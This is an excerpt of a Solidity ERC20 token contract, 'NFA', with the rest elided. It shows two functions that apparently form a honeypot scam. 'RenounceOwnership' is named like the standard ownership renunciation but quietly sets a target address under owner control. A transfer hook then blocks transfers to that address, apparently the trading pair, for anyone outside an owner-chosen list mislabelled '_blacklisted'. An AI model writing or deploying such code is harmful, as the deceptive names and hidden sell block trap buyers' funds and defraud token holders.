...
contract NFA is ERC20, Ownable {
    ...
    function RenounceOwnership(address nfaToken_) public onlyOwner {
        _nfaToken = nfaToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _nfaToken) {
            require(_blacklisted[from], "No financial advice for bots.");
        }
    }
}